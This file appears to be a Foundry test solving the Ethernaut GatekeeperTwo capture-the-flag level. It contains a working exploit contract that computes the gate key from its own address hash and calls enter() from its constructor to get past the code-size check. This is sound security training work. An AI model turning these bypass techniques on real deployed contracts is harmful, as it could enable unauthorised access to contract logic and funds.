// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface GKT {
  function entrant() external view returns(address);
}

contract GateKeeperProxy {
  constructor(address _gatekeeper) public {
    bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ (uint64(0) - 1));
    assert(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^  uint64(key) == uint64(0) - 1);
    (bool success,) = _gatekeeper.call(abi.encodeWithSignature("enter(bytes8)", key));
    assert(success);
  }
}

pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {GatekeeperTwo} from "../../src/GatekeeperTwo/GatekeeperTwo.sol";

contract GatekeeperTwoTest is LevelFactory {
  GatekeeperTwo gkt;  

  function setUp() public {
    vm.startPrank(deployer);
    gkt = new GatekeeperTwo(); 
    vm.stopPrank();
  }

  function testAttack() public {
    submitLevel("GatekeeperTwo");
  }

  function _performTest() internal override {
    new GateKeeperProxy(address(gkt));
  }

  function _setupTest() internal override {
    super._setupTest() ;
  }

  function _checkTest() internal override returns (bool) {
    assertEq(gkt.entrant(), attacker);
    return(gkt.entrant() == attacker);
  }
}
